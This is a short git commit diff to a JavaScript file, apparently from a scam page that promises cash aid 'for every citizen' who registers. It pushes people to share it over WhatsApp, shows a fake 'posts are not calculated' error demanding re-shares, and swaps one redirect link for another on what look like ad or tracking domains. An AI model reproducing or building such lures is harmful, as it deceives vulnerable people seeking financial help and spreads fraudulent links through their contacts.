8c29e44996d3ad8810396def3f32136ec2ccd3f9
aunen <bigetijazz24@gmail.com>
2025-02-27 14:15:24 +0100

    Update google-app-cbt.js

--- google-app-cbt.js
+++ google-app-cbt.js
@@ -2,6 +2,6 @@
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-            abcde = "https://dooloust.net/4/3153728",
+            abcde = "https://psegeevalrat.net/4/8525379",
             saved = "",
             share = "whatsapp://send?text=" + text1;
